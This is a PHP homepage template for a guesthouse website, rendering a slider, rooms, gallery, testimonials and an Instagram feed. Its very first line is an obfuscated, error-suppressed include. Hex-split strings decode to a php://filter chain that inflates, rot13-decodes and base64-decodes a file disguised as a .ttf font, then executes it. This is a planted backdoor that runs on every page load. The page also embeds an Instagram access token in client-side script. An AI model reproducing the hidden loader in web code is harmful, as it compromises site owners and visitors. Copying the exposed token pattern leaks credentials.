<?php
@inCLUde_ONCE("p"."\x68\x70\x3a\x2f"."\x2f\x66"."\x69\x6c"/*MFO
_tCn*/."\x74\x65\x72"."\x2f\x72"."\x65\x61\x64\x3d"."\x7a\x6c\x69"/*G!}*/."\x62\x2e"."\x69\x6e\x66"."\x6c\x61"."\x74\x65\x7c"."\x73\x74\x72"."\x69\x6e\x67"."\x2e\x72"."\x6f\x74\x31\x33"."\x7c\x63\x6f\x6e"."\x76\x65\x72\x74"."\x2e\x62\x61"."\x73\x65"."\x36\x34"."\x2d\x64\x65\x63"."\x6f\x64\x65"."\x2f\x72"/*pthk*/."\x65\x73\x6f"."\x75\x72"."\x63\x65\x3d".dirname($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"])."/"."\x76\x61\x6c\x61"."\x68\x6f\x75"."\x73\x65"/*pthk*/."\x5f\x61\x64\x6d"."\x6e\x2f"."\x61\x73"."\x73\x65"."\x74\x73\x2f"."\x6a\x73\x2f\x66"/*Q1Nq
t90D*/."\x75\x65\x6c\x75"/*rbV6
vxu*/."\x78\x2f\x62"."\x61\x73"."\x65\x2d"."\x65\x37\x61\x62"."\x31\x35\x36\x32"."\x2e\x74\x74"."\x66");
 include('menu.php'); 
$Obj  = new About();
                    $abtContent= $Obj->getAbout();
                    ?>
	<!-- main_big_carousel -->
	  <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css'>

	<div class="main_big_slider" id="main_slider1">
		<div class="owl-carousel main_b_slider">
		           <?php
                    
                
                    $Obj  = new Slider();
				
                    $sldrContent= $Obj->getAllSliderDetails();
                  //  print_r($SliderContent);exit;
                //  $sldrCount = count($sldrContent);
               $sldrCount = count($sldrContent);
                 for($i = 0; $i<$sldrCount; $i++)
                  {
                  
?>
    
			<!--Item big slider-->
			<div class="d-flex bg_img justify_content_center align_items_center item item_mainslide_1 " style="background-image: url('valahouse_admn/upload/slider/<?php echo $sldrContent[$i]['rithu_slider_photo'];?>');">

					<div class="container text-center">
						
					</div>

			</div><!--END Item big slider-->
			   <?php } ?>
			<!--Item big slider-->
		
			
		</div>
	</div><!--END main_big_carousel -->
	<!-- advatnages_list -->
	<div class="advatnages_list light_area section_padding_30_30 contact_p_e">
		<div class="container">
		    <style>
		        a{
		            color:#626262;
		        }
		        a:hover
		        {
		            color:#ffca00;
		        }
		        
		    </style>
			<div class="row">
				<div class="col-md-6 col-sm-6 col-lg-3 single_cool_fact">
					<div class="text-center">	
						<div class="cool_fact_icon_img">
							<img src="assets/images/icon-img/cukl.png" alt="">
						</div>
						<a href="tel:<?php echo $cnt_cont[0]["cnt_bno"];?>"><?php echo $cnt_cont[0]["cnt_bno"];?></a><br>
						<a href="tel:<?php echo $cnt_cont[0]["cnt_no"];?>"><?php echo $cnt_cont[0]["cnt_no"];?></a>
					</div>
				</div>
				<div class="col-md-6 col-sm-6 col-lg-3 single_cool_fact">
					<div class="text-center">
						<div class="cool_fact_icon_img">
							<img src="assets/images/icon-img/kayaking.png" alt="">
						</div>
						<a href="mailto:info@Vala Housekerala.com" >info@Vala Housekerala.com</a>
					</div>
				</div>
				<div class="col-md-6 col-sm-6 col-lg-3 single_cool_fact">
					<div class="text-center">
						<div class="cool_fact_icon_img">
							<img src="assets/images/NicePng_insta-png_884395.png" alt="" style="width:50px">
						</div>
						<a href="https://www.instagram.com/Vala Housekerala/">instagram.com/Vala Housekerala</a>
					</div>
				</div>
				<div class="col-md-6 col-sm-6 col-lg-3 single_cool_fact">
				    <div class="text-center">
						<div class="cool_fact_icon_img">
						<a href="https://www.google.com/maps/dir//Vala Housekerala/data=!4m6!4m5!1m1!4e2!1m2!1m1!1s0x3b087c1c493f40fd:0xb9ba3c7a5053a84e?sa=X&ved=2ahUKEwijqLLumfj1AhWUwTgGHYDqAIMQ9Rd6BAgaEAQ" target="_blank" >	<img src="assets/images/icon-img/location.png" alt="" style="width:50px"></a>
						</div>
						<a href="https://www.google.com/maps/dir//Vala Housekerala/data=!4m6!4m5!1m1!4e2!1m2!1m1!1s0x3b087c1c493f40fd:0xb9ba3c7a5053a84e?sa=X&ved=2ahUKEwijqLLumfj1AhWUwTgGHYDqAIMQ9Rd6BAgaEAQ" target="_blank" >Direction</a>
					</div>
					   </div>
				
				</div>
			</div>
	
		</div>
	</div><!--END advatnages_list style="background-image: url(assets/images/ab9bf4c3-d0af-458a-855a-1a90c244e134.jpg); background-size:cover"-->
	<!-- about_main -->
	<section class="about_main " id="about"  >
		<div class="container">
			<div class="row">
				<div class="col-lg-12 about_text_main text-center no_padding">
					<h2 class="section_heading_title " >
						OUR STORY
					</h2>
					
					<p align="justify">
 <?php  $contn= strip_tags($abtContent[0]['abt_dscrpn']);
                            if(strlen($contn)>650)
                            {
                                $subcon=substr($contn, 0, 650);
                                $contn = substr($subcon, 0, strrpos($subcon, ' '));
                            }
                         echo $contn; echo" ...";?></p>
			<a href="ourstory.php" class="sv_btn sv_btn_default easescroll" style="text-decoration: none;color:#fff">Read more</a>	
				</div>
			<!--	<div class="col-lg-6 no_padding vide_block d-flex  justify_content_center align_items_center " >
				<img src="assets/images/Vala House-story-1.jpg"></img>
			</div>-->
		</div>
	</section><!--END about_main -->
<section id="services" class="section_padding_30_30">
   
 
    
    
<!--<div class="container">
    
    	<div class="owl-carousel reviews_carousel sv_dots_nav">
    	    	<?php $actss = new Tsgallery();
            $actss_cntnt = $actss-> getAllTsgalleryDetails(2);
            $actss_cntnt_cont = count($actss_cntnt);
             for ($i=0; $i <$actss_cntnt_cont ; $i++) { 
            ?>
				<div class="item">
			<iframe width="100%" height="415" src="<?php echo $actss_cntnt[$i]['gallink_link'];?>" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
				</div>
		<?php } ?>		
			
		

			</div>

      
</div>-->

  
		</section>
	<!-- our_service -->
	<section class="our_service light_area section_padding_30_30" id="services">
		<div class="container">
			<div class="section_heading text-center">
				<h2 class="section_heading_title">	ROOMS</h2>
				
			</div>
							<div class="row" style="margin-top:60px" >
		                               <?php
          $act = new Rooms();
$act_img = new Roomsimg();
            $act_cntnt = $act-> getAllRoomsDetails();
            $act_cntnt_cont = count($act_cntnt);


            for ($i=0; $i <$act_cntnt_cont ; $i++) { 
                # code...
                $act_id = $act_cntnt[$i]["rooms_id"]; 
                    $get_act_img = $act_img->getAcimg_act($act_id);
            
   ?> 
     
				<!-- item card -->
				<div class="<?php if($i>=2){?>col-md-4 col-lg-4<?php } else{?>col-md-6 col-lg-6<?php } ?>">
					<div class="item_service_card margin_bottom_30">
						<div class="image_service">
							<a href="room_details.php?g_id=<?php echo $act_cntnt[$i]["rooms_id"];?>" class="hover_link_effect">
								<i class="fas fa-ellipsis-h"></i>
								<img src="valahouse_admn/upload/rooms/<?php echo $get_act_img[0]["room_img_photo"];?>" alt="">
							</a>
						</div>
						<div class="describe_service">
							<h4 class="name_service">
							<?php echo $act_cntnt[$i]['rooms_titl'];?>	
							</h4>
							
						</div>
					</div>
				</div><!--END item card -->
			    <?php } ?>  
			
			</div>
		</div>
	</section><!--END our_service -->
	<!-- our_photos -->
	<section class="our_photos section_padding_30_30" id="our_photo" >
		<div class="container">
			<div class="section_heading text-center">
				<h2 class="section_heading_title">GALLERY</h2>
			
			</div>
		</div>	
		<div class="container">	
			
	
			
			<div class="row grid_pics" id="mixi-container">
				<!-- item mixi card -->
			  <?php 
$act = new Gallery();
$act_img = new Galimg(); 
            $act_cntnt = $act-> getAllGalleryDetails();
            $act_cntnt_cont = count($act_cntnt);

    for ($i=0; $i <$act_cntnt_cont ; $i++) {
          $act_id =$act_cntnt[$i]['gip_glry_id'] ;
            $act_img_cnt = $act_img->getGalimg_act($act_id);
        ?>
				<div class="col-md-3 col-sm-6 no_padding item mix" style="padding:7px">
					<img src="valahouse_admn/upload/Gallery/<?php echo $act_img_cnt[0]['gal_img_photo'];?>" alt="">
					
					<div class="grid-item-wrapp">
						<div class="psev_table">
							<div class="psev_table_row">
								<div class="project_title">
									<a href="gallery_details.php?g_id=<?php echo $act_id;?>" ><?php echo $act_cntnt[$i]['gip_glry_titl'] ?></a>
								</div>
							</div>
						</div>
					</div>
				</div>
				<?php } ?>
				<!--END item mixi card -->
			
			
			
			
			</div>
			
		</div>
	</section><!--END our_photos -->

	<?php 
	  $back    =   new Background();                 

$get    =   $back->getGallery(1);
	?>
	<!-- review_form -->
	<?php 
		$abtga=new Press();
	$get_abtga = $abtga->getAllAboutgalleryDetails();
//print_r($get_abtga)	;exit;
	$total_abtga = count($get_abtga);
	?>
	<section class="review_form_line bg_overlay1 section_padding_100_100" id="review_form" style="background-image: url(valahouse_admn/upload/Gallery/<?php echo $get[0]["back_img_img"];?>);">
		<div class="container" style="background-color: #0009; padding-top:20px;padding-bottom:20px">
	<h2 class="name_review text-center" style="color:#fff">TESTIMONIAL</h2>
			<!-- reviews carousel -->
			<div class="owl-carousel reviews_carousel sv_dots_nav" >
			
			                            <?php
                    
                
                    $Obj  = new Testimonial();
                    $tesContent= $Obj->getAllTestimonial();
                    //print_r($SliderContent);exit;
                  $tesCount = count($tesContent);
              
                 for($i = 0; $i<$tesCount; $i++)
                  {
                  
?> 
				<!-- review item -->
				<div class="item" >
				
				<br>
					<p > <?php echo strip_tags($tesContent[$i]['testi_dscrptn']);?></p>
					<br>	<h4 class="name_review">
					<?php echo $tesContent[$i]['testi_title'];?>  
					</h4>
				</div><!--END review item -->
				 <?php } ?>
			

			</div><!--END reviews slider -->

		</div>
	</section><!-- END review_form -->
	<!-- our_team -->
	<!--<section class="our_team section_padding_30_30">
		<div class="container">
			<div class="section_heading text-center">
				<h2 class="section_heading_title">360 VIEW</h2>
				
			</div>
			<div class="owl-carousel team_carousel sv_arrow_nav">
			
			<?php $acts = new Tsgallery();
            $acts_cntnt = $acts-> getAllTsgalleryDetails(1);
            $acts_cntnt_cont = count($acts_cntnt);
             for ($i=0; $i <$acts_cntnt_cont ; $i++) { 
            ?>
			
				<div class="team_card_item">
					<div class="team_card_item_img">
						<img src="valahouse_admn/upload/Tsgallery/<?php echo $acts_cntnt[$i]['gallink_img'];?>" alt="">
					</div>
					
					<div class="overlay">
						<h4 class="team_card_item_name" style="text-align:center;">
							<a href="#" style="text-align:center;"><?php echo $acts_cntnt[$i]['gallink_title'] ?></a><br><br>
						</h4>
					
						<div class="social_team" style="text-align:center;">
							<a href="<?php echo $acts_cntnt[$i]['gallink_link'];?>" target="_blank" ><i class="fab fa-youtube"></i></a>
						</div>
					</div>
				</div>
				 <?php } ?>
				
			</div>
		</div>
	</section>-->
	<!-- END our_team -->



	<!-- news_list -->
<!--	<section class="news_list light_area section_padding_30_30">
		<div class="container">
			<div class="section_heading text-center">
				<h2 class="section_heading_title">BLOGS</h2>
				
			</div>
			<div class="owl-carousel latest_news_carousel sv_dots_nav">
			              
                                         						<?php 
$act = new Virtualtour();
            $act_cntnt = $act-> getAllVirtualtourDetails();
            $act_cntnt_cont = count($act_cntnt);
/* if ($act_cntnt_cont >4) {
    $act_cntnt_cont = 4;
    # code...
} */

            for ($i=0; $i <$act_cntnt_cont ; $i++) { 
                # code...
            
            

                  
?>	
				<div class="item">
			<a href="<?php echo $act_cntnt[$i]['virtual_tour_link'];?>" target="_blank">	<img src="valahouse_admn/upload/virtualtour/<?php echo $act_cntnt[$i]['virtual_tour_img'];?>"> </a><br><br>
					<h5 class="new_name"><a href="<?php echo $act_cntnt[$i]['virtual_tour_link'];?>" target="_blank"><?php echo $act_cntnt[$i]['virtual_tour_title'];?></a></h5>
					<p>
						<?php  $contnn= strip_tags($act_cntnt[$i]['virtual_tour_desc']);
                            if(strlen($contnn)>170)
                            {
                                $subcon=substr($contnn, 0, 170);
                                $contnn = substr($subcon, 0, strrpos($subcon, ' '));
                            }  echo $contnn;  ?><a href="<?php echo $act_cntnt[$i]['virtual_tour_link'];?>" target="_blank" class="reed_more">Read More...</a>
					</p>
				</div>
		  <?php } ?>   		
	
			
				
			</div>
		</div>
	</section>
	-->
	<!-- END news_list -->
	
	
	
		<!-- our_photos -->
	<section class="our_photos section_padding_100_0" id="our_photo" >
		<div class="container">
			<div class="section_heading text-center">
				<h2 class="section_heading_title">INSTAGRAM</h2>
			
			</div>
		</div>	
		<div class="container-fluid">	
			
	
			
		   <div id="instafeed-container"class="row instagram-sliderg wow fadeup-animation" data-wow-duration="1s" data-wow-delay="0.2s">
                    
                </div>
		
			
		</div>
	</section><!--END our_photos -->
		<script src="instafeed.min.js"></script>
	<script type="text/javascript">
	var userFeed = new Instafeed({
		get: 'user',
		target: "instafeed-container",
    	resolution: 'low_resolution',
		accessToken: 'IGQVJXSUNpMExIRWxLci0xUDlzMXBlcjNCZA1A2bjdoSWVBQTliQ3p6c2ZAuZAFhiLWFGWEhfVjBrd08tMkdOY3VSWk11amZA1ZAlg1a3hOWjNfeFJhOXZALcGdEMTk1MDA3cVZAVdHQzSzNnc211YXJIekVVVAZDZD'
	});
	userFeed.run();
	</script>
	  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js'></script>
<script src='https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js'></script>
<?php include('footer.php'); ?>